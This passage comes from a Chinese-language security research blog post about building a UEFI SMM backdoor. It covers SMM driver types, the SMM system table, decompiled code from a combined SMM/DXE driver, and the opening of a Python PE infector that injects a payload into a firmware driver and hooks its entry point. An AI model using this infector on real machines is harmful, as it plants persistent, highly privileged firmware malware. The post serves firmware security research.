<li>SMM驱动 —— SMM驱动程序被启动一次，在SMM初始化阶段直接进入SMRAM。</li>
<li>SMM&#x2F;DXE组合驱动 —— 加载两次的驱动程序的组合：作为DXE驱动程序和作为SMM驱动程序。</li>
</ul>
<p>所有这些驱动程序都有相同的入口点函数类型特征:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="title function_">EFI_STATUS</span></span><br><span class="line"><span class="params">(EFIAPI * EFI_IMAGE_ENTRY_POINT)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="params">    IN EFI_SYSTEM_TABLE *SystemTable</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>


<p>SMM和SMM&#x2F;DXE组合驱动只能在入口点使用<code>EFI_BOOT_SERVICES</code>函数和DXE协议，SMI管理过程中调用的协议和回调只能使用SMST函数和SMM协议。<br>以下是来自EDK2源代码的SMM系统表结构和我的一些附加注释:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// System Management System Table (SMST)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 系统管理系统表(SMST)是一个包含管理SMRAM分配和提供基本I/O服务的公共服务集合的表。</span></span><br><span class="line"><span class="comment">// 这些服务用于预引导和runtime时使用。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EFI_SMM_SYSTEM_TABLE2</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// SMST的表头.</span></span><br><span class="line">    EFI_TABLE_HEADER Hdr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指向包含供应商名称的以空结尾的Unicode字符串的指针。</span></span><br><span class="line">    <span class="comment">// 这个指针可以为空。</span></span><br><span class="line">    CHAR16 *SmmFirmwareVendor;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 固件的特殊修订</span></span><br><span class="line">    UINT32 SmmFirmwareRevision;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从SMST中添加、更新或删除配置表项。</span></span><br><span class="line">    EFI_SMM_INSTALL_CONFIGURATION_TABLE2 SmmInstallConfigurationTable; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// I/O Service</span></span><br><span class="line">    EFI_SMM_CPU_IO2_PROTOCOL SmmIo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Runtime memory services                               </span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从SMRAM中分配内存池</span></span><br><span class="line">    EFI_ALLOCATE_POOL SmmAllocatePool;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向系统返回SMRAM内存池</span></span><br><span class="line">    EFI_FREE_POOL SmmFreePool;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 从SMRAM中分配内存页</span></span><br><span class="line">    EFI_ALLOCATE_PAGES SmmAllocatePages;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将内存页释放给系统</span></span><br><span class="line">    EFI_FREE_PAGES SmmFreePages;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在SMM中，在一个不同的应用程序处理器上执行调用者提供的代码流。</span></span><br><span class="line">    EFI_SMM_STARTUP_THIS_AP SmmStartupThisAp;</span><br><span class="line">                                                              </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// CPU 信息记录</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个介于0和NumberOfCpus字段之间的数字。</span></span><br><span class="line">    <span class="comment">// 该字段指定哪个处理器正在执行SMM基础架构。</span></span><br><span class="line">    UINTN CurrentlyExecutingCpu;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 平台中可能的处理器数量。这是一个基于1的计数器。</span></span><br><span class="line">    UINTN NumberOfCpus;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指向一个数组</span></span><br><span class="line">    <span class="comment">// 其中每个元素描述了由CpuSavaState指定的相应保存状态中的字节数</span></span><br><span class="line">    <span class="comment">// 数组中总是有大量的cpu条目</span></span><br><span class="line">    UINTN *CpuSaveStateSize;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指向一个数组，其中每个元素都是一个指向CPU保存状态的指针。</span></span><br><span class="line">    <span class="comment">// CpuSaveStateSize中相应的元素指定了保存状态区域的字节数。</span></span><br><span class="line">    <span class="comment">//  数组中总是有大量的cpu条目</span></span><br><span class="line">    VOID **CpuSaveState;      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 扩展表</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 缓冲区SmmConfigurationTable中UEFI配置表的个数。</span></span><br><span class="line">    UINTN NumberOfTableEntries;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指向UEFI配置表的指针。</span></span><br><span class="line">    <span class="comment">// 表中的条目数为NumberOfTableEntries。</span></span><br><span class="line">    EFI_CONFIGURATION_TABLE *SmmConfigurationTable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Protocol services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安装SMM协议接口。</span></span><br><span class="line">    EFI_INSTALL_PROTOCOL_INTERFACE SmmInstallProtocolInterface;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 卸载SMM协议接口</span></span><br><span class="line">    EFI_UNINSTALL_PROTOCOL_INTERFACE SmmUninstallProtocolInterface;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询句柄，以确定其是否支持指定的SMM协议。</span></span><br><span class="line">    EFI_HANDLE_PROTOCOL SmmHandleProtocol;</span><br><span class="line">                                                                          </span><br><span class="line">    <span class="comment">// 注册一个在安装特定协议接口时被调用的回调函数。</span></span><br><span class="line">    EFI_SMM_REGISTER_PROTOCOL_NOTIFY SmmRegisterProtocolNotify;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回支持指定协议的句柄数组。</span></span><br><span class="line">    EFI_LOCATE_HANDLE SmmLocateHandle;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回与给定协议匹配的第一个SMM协议实例。</span></span><br><span class="line">    EFI_LOCATE_PROTOCOL SmmLocateProtocol;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// SMI Management函数</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 管理特定类型的SMI。</span></span><br><span class="line">    EFI_SMM_INTERRUPT_MANAGE SmiManage;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 注册一个要在SMM中执行的handler。</span></span><br><span class="line">    EFI_SMM_INTERRUPT_REGISTER SmiHandlerRegister;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在SMM中注销handler。</span></span><br><span class="line">    EFI_SMM_INTERRUPT_UNREGISTER SmiHandlerUnRegister;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>除了前面描述的DXE阶段的协议外，SMM驱动程序还可以在SMI管理期间使用以下的SMM-only协议:</p>
<ul>
<li><p><code>EFI_SMM_STATUS_CODE_PROTOCOL</code> —— 向其他UEFI PI组件报告SMM代码错误。</p>
</li>
<li><p><code>EFI_SMM_CPU_PROTOCOL</code> —— 提供对保存的CPU执行状态的访问。</p>
</li>
<li><p><code>EFI_SMM_CPU_IO2_PROTOCOL</code> —— 为SMM代码提供CPU I&#x2F;O和内存访问。</p>
</li>
<li><p><code>EFI_SMM_PCI_ROOT_BRIDGE_IO_PROTOCOL</code> —— 提供基本的内存、I&#x2F;O、PCI配置和DMA接口，这些接口用于在PCI root bridge控制器后面抽象访问PCI控制器。</p>
</li>
<li><p><code>EFI_SMM_READY_TO_LOCK_SMM_PROTOCOL</code> —— SMM Foundation发起的强制协议，标识SMRAM即将被锁定</p>
</li>
<li><p><code>EFI_SMM_END_OF_DXE_PROTOCOL</code> —— 类似于<code>EFI_SMM_READY_TO_LOCK_SMM_PROTOCOL</code>，在调用任何第三方内容之前由PI平台代码发起，包括ROM和UEFI可执行文件选项，这些可执行文件不是来自平台制造商。</p>
</li>
</ul>
<h2 id="编写SMM-DXE组合驱动"><a href="#编写SMM-DXE组合驱动" class="headerlink" title="编写SMM&#x2F;DXE组合驱动"></a>编写SMM&#x2F;DXE组合驱动</h2><p>SMM&#x2F;DXE组合驱动程序看起来非常整洁，但却有恶意：你可以有一个单独的后门，可以同时执行DXE和SMM阶段的payload。<br>我原以为在EDK2、Quark BSP等公共资源中找到这类驱动程序的可用示例会很困难。实际上，只有两篇关于UEFI SMM驱动程序开发的公开文章：<a target="_blank" rel="noopener" href="https://docs.google.com/file/d/0B3M7WqiAoyr_NWI2NjdhYWUtMjE1NS00Njc2LThmZjItNWExZDZkYzUzMjJk/edit?authkey=CM6a8JYE&ddrp=1&hl=en#">EFI Howto, Write a SMM Driver</a>和<a target="_blank" rel="noopener" href="http://blogs.phoenix.com/phoenix_technologies_bios/2008/12/bios-undercover-writing-a-software-smi-handler.html">BIOS Undercover: Writing A Software SMI Handler</a>——它们都是过时的、不完整的或特定于供应商的。<br>为了学习如何编写组合驱动程序，我决定对我主板固件中现有的组合驱动程序做一个简短的逆向工程。这一次我使用Nikolaj Schlej的<a target="_blank" rel="noopener" href="https://github.com/LongSoft/UEFITool">UEFITool</a>来处理flash image ，如果你需要进行固件修改和重建——这个优秀的工具比我上一篇文章中提到的<a target="_blank" rel="noopener" href="https://github.com/theopolis/uefi-firmware-parser">uefi-firmware-parser</a>能够更好地工作。<br>我的目标是名为26A2481E-4424-46A2-9943-CC4039EAD8F8的组合驱动程序(<a target="_blank" rel="noopener" href="https://www.google.com/search?q=26A2481E-4424-46A2-9943-CC4039EAD8F8">google</a>告诉我这个GUID属于S3Save UEFI驱动程序，但对于我们的目的来说，这并不重要):</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161728358.png" alt="image-20230809161728358"></p>
<p>在提取驱动程序的body之后，让我们将它加载到IDA Pro中，并观察模块入口点周围的代码。前一篇文章中的PEI模块的逆向工程技巧也适用于DXE和SMM驱动程序，只有一个主要的区别——DXE和SMM阶段代码使用x86_64架构，而不是PEI的i386。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">DWORD __stdcall <span class="title function_">EntryPoint</span><span class="params">(PVOID ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_SYSTEM_TABLE *v2; <span class="comment">// rbx@1</span></span><br><span class="line">    PVOID v3; <span class="comment">// rdi@1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v2 = SystemTable;</span><br><span class="line">    v3 = ImageHandle;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化ImageHandle和SystemTable的全局变量</span></span><br><span class="line">    sub_180002074(ImageHandle, SystemTable);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// do the stuff</span></span><br><span class="line">    <span class="keyword">return</span> sub_180001FD0(v3, v2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EFI_RUNTIME_SERVICES * __fastcall <span class="title function_">sub_180002074</span><span class="params">(PVOID ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_RUNTIME_SERVICES *v2; <span class="comment">// rax@2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!gST)</span><br><span class="line">    &#123;</span><br><span class="line">        gST = SystemTable;</span><br><span class="line">        gBS = SystemTable-&gt;BootServices;</span><br><span class="line">        v2 = SystemTable-&gt;RuntimeServices;</span><br><span class="line">        gImageHandle = ImageHandle;</span><br><span class="line">        gRuntimeServices = v2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD __fastcall <span class="title function_">sub_180001FD0</span><span class="params">(PVOID ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_SYSTEM_TABLE *v2; <span class="comment">// rbx@1</span></span><br><span class="line">    PVOID v3; <span class="comment">// rdi@1</span></span><br><span class="line">    __int64 v4; <span class="comment">// rax@1</span></span><br><span class="line">    <span class="type">char</span> v6; <span class="comment">// [sp+38h] [bp+10h]@1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v2 = SystemTable;</span><br><span class="line">    v3 = ImageHandle;</span><br><span class="line">    bInSmm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行各种初始化</span></span><br><span class="line">    sub_180002074(ImageHandle, SystemTable);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定位 EFI_SMM_BASE2_PROTOCOL</span></span><br><span class="line">    LODWORD(v4) = v2-&gt;BootServices-&gt;LocateProtocol(</span><br><span class="line">        &amp;gEfiSmmBase2ProtocolGuid,</span><br><span class="line">        <span class="number">0</span>i64,</span><br><span class="line">        &amp;gEfiSmmBase2Protocol</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (v4 &amp; <span class="number">0x8000000000000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v4 != <span class="number">0x800000000000000E</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bInSmm = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没找到EFI_SMM_BASE2_PROTOCOL , 则执行 DXE 相关操作</span></span><br><span class="line">        <span class="keyword">return</span> sub_180001F54(v3, v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gEfiSmmBase2Protocol-&gt;InSmm(gEfiSmmBase2Protocol, &amp;bInSmm);</span><br><span class="line">    <span class="keyword">if</span> (!bInSmm)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 找到了EFI_SMM_BASE2_PROTOCOL但不在SMM中 ,则执行 DXE 相关操作</span></span><br><span class="line">        <span class="keyword">return</span> sub_180001F54(v3, v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 驱动加载到SMRAM中，执行SMM相关操作</span></span><br><span class="line">    <span class="keyword">return</span> sub_180001ED8(v3, v2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_180001ED8</span><span class="params">(<span class="type">void</span> *a1, EFI_SYSTEM_TABLE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rax@1</span></span><br><span class="line">    __int64 v3; <span class="comment">// rax@3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行各种SMM驱动初始化</span></span><br><span class="line">    LODWORD(v2) = sub_1800021D8(a1, a2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(v2 &amp; <span class="number">0x8000000000000000</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        LODWORD(v2) = sub_180000610(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(v2 &amp; <span class="number">0x8000000000000000</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取SMM表的地址</span></span><br><span class="line">            LODWORD(v3) = gEfiSmmBase2Protocol-&gt;GetSmstLocation(</span><br><span class="line">                gEfiSmmBase2Protocol,</span><br><span class="line">                &amp;gSMST</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (v3 &amp; <span class="number">0x8000000000000000</span> || !gSMST)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// error：无法获取 SMST地址</span></span><br><span class="line">                LODWORD(v2) = <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 执行其他SMM驱动操作</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>如你所见，该模块的入口点调用<code>sub_180002074()</code>函数来初始化全局变量，<code>sub_180001FD0()</code>使用<code>EFI_SMM_BASE2_PROTOCOL.InSmm()</code>来确定驱动程序在SMM模式下运行，如是 —— 则使用<code>EFI_SMM_BASE2_PROTOCOL.GetSmstLocation()</code>来定位SMST，并继续执行各种与SMM相关的操作。当驱动被加载为DXE时，调用<code>sub_180001F54()</code>进行DXE相关操作，当驱动加载到SMM中时使用<code>sub_180001ED8()</code>。</p>
<h2 id="在SMM中运行代码"><a href="#在SMM中运行代码" class="headerlink" title="在SMM中运行代码"></a>在SMM中运行代码</h2><p>正如所说，要在SMM中运行一些定制代码，你需要有一个硬件编程器，如果你的主板有一个COM端口——它可能对读取SMM代码的调试输出非常有用。<br>在下图中你可以看到我的测试配置，在之前的文章中提到过：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161739308.png" alt="image-20230809161739308"></p>
<p>当清楚SMM&#x2F;DXE组合驱动程序应该如何工作后——我编写了一个简单的hello world驱动程序，它使用<code>EFI_SMM_BASE2_PROTOCOL</code>来定位SMST并将其地址打印到调试输出。首先，我决定将驱动程序作为一个新文件添加到FFS文件卷中，但当我用修改后的固件刷写到我的测试系统时——hello world驱动没有被加载。我仍然不知道导致这种结果的原因：可能，有一些问题与PE&#x2F;FFS头或驱动加载顺序存在依赖关系。好吧，但至少有一件好事：修改后的固件运行正常，这意味着英特尔DQ77KB板没有使用任何自定义机制来验证固件 image或FFS文件卷的完整性。<br>下一次测试，我决定不在逆向工程和调试上浪费时间了——感染上面提到的现有组合驱动程序的PE image。<br>使用Python和<a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/pefile">pefile库</a>，我编写了一个简单的PE文件感染器，它将payload PE image复制到目标 image新的节上，并hook它的入口点来在image加载上执行payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># see struct _INFECTOR_CONFIG in SmmBackdoor.h</span></span><br><span class="line">INFECTOR_CONFIG_SECTION = <span class="string">&#x27;.conf&#x27;</span></span><br><span class="line">INFECTOR_CONFIG_FMT = <span class="string">&#x27;QI&#x27;</span></span><br><span class="line">INFECTOR_CONFIG_LEN = <span class="number">8</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IMAGE_DOS_HEADER.e_res 标记被感染文件的magic常数</span></span><br><span class="line">INFECTOR_SIGN = <span class="string">&#x27;INFECTED&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用payload感染src image，并可选择将其保存到dst</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infect</span>(<span class="params">src, payload, dst = <span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_infector_config_offset</span>(<span class="params">pe</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> section <span class="keyword">in</span> pe.sections:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 找到 payload image的.conf节</span></span><br><span class="line">            <span class="keyword">if</span> section.Name[: <span class="built_in">len</span>(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> section.PointerToRawData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        